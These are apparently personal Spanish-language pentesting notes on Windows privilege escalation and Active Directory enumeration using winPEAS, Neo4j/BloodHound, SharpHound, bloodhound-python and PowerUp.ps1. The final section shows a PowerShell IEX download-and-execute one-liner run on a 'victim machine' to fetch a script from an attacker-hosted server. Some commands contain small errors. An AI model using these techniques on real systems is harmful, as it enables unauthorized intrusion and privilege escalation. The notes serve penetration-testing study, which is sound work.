-----
- Tags: #escalada #windows #basico #teoria #practica
-----

# Recopilación exhaustiva

### Una vez probados todos los [[Intentos Básicos]] para ver si encontramos una vía potencial de escalar privilegios y que está no de resultados, podríamos intentar realizar una recopilación exhaustiva de información del sistema con herramientas automatizadas como [winPEAS.exe](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) así como con la realización de **base de datos de grafos** con información del sistema. 

----
# Base de datos de grafos con neo4j

### **Neo4j** es un software libre de Base de datos orientada a grafos, implementado en Java el cual podremos utilizar junto a **Bloohound**, una herramienta visor gráfico que tiene como objetivo realizar un mapeo de todas las relaciones, configuraciones en un Dominio de Windows siendo utilizando para identificar las rutas que pueden ser complejas para identificar, falencias de configuración de usuarios y políticas. 

```bash
sudo apt install neo4j bloodhound 
```

### Una vez instaladas las herramientas, es importante tener en cuenta que se necesita la version de **java 11** para que neo4j funcione correctamente. 

```bash
sudo update-alternatives --config java
```

### Una vez seleccionada la versión 11 de java, podríamos dar comienzo a la realización de nuestra base de datos.

```bash
neo4j console &>/dev/null & disown
```

### Una vez ejecutado el comando, se nos levantará un puerto (**7474**) en donde tendremos una interfaz gráfica en la web, donde deberémos configurar nuestras credenciales de la base de datos, por default las credenciales son **neo4j:neo4j**. 

### Una vez configurada nuestra contraseña, habría que ejecutar el comando: 

```bash
bloodhound &>/dev/null & disown 
```

### Ahora solo quedaría recopilar la información del sistema windows, en caso de tener una **powershell** podríamos hacer uso de la herramienta [sharphound.psq](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1),  una vez descargada esta herramienta, solo habría que subirla a la máquian víctima y ejecutarlo 

#### Para ver como se ejecuta el scrip, desde nuestra máquina linux: 
```bash
cat Sharphound.ps1 | grep function # Output -> Invoke-Bloodhound
cat Sharphound.ps1 | grep "Invoke-Bloodhound"
```
#### Una vez que sepamos como se hace para ejecutar el script: 
```powershell
> Import-Module .\Sharphound.ps1
> Invoke-Module -CollectionMethod All
```

### Este último comando creara un comrpimido **.zip** con la información del sistema le cual deberemos descargar para posteriormente subir a la interfaz del **bloodhound**. 

### Una vez subida la información a bloodhound, está herramienta nos podrá ayudar a detectar posibles rutas para escalar privilegios, entre otras cosas.

-----
# Bloohound-python 

### La herramienta [Bloodhoun-python](https://github.com/fox-it/BloodHound.py) es una herramienta que nos permite realizar la recopilación de información del sistema sin tener acceso al mismo, como en el caso de la creación de **Base de datos de grafos con Neo4j** en donde usamos el SharpHound.ps1 para la creación de un archivo **.zip** el cual tendremos que subir posteriormente a bloodhound. 

```bash
git clone https://github.com/fox-it/BloodHound.py
mv BloodHound.py bloodhound-py
cd !$ 
python3 setup.py install 

mv bloodhound.py bloodhound-python

python3 blodhound-python -c All -u 'username' -p 'password' -ns {target_ip} -d {domain}
```
### Esto lo que hará será crear archivos **json**.

----
# PowerUp.ps1

### [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) es un script en powershell que se encarga de automatizar la búsqueda de posibles vías interesantes para el intento de escalada de privilegio, lo que es muy útil de cara a la recopilación de información.

#### Máquina atacante
```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1

# Una vez descargado, podemos editarlo para realizar la invocación del mismo agregando la línea 'Invoke-AllChecks'

python3 -m http.server 80
```
#### Máquina víctima
```powershell
IEX(New-Object Net.WebClient).downloadString('http://{our_uip}/PowerUp.ps1')
```

